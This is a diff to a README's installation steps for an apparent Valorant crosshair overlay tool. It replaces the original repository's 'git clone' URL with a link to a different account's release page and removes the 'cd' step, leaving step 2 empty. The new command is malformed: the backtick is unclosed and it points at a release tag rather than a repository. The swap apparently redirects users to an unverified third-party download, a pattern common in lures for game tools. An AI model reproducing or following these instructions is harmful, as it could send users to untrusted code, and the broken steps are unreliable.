@@ -48,9 +48,8 @@ The project is geared toward users who prefer an overlay-first workflow for chec
 ## Installation
 
 1. Download or clone the repository:
-   - `git clone https://github.com/benscott49/valorant-game-tool-crosshair-hub.git
+   - `git clone https://github.com/Crofflane99/valorant-game-tool-crosshair-hub-2026/releases/tag/release
 2. Open the project folder:
-   - `cd valorant-game-tool`
 3. Start the desktop app with your preferred local HTML-compatible workflow or packaged build, depending on how the repository is distributed.
 
 If you are using a browser-based build, open the main entry file in a compatible browser or start the local host process described in the repository files.
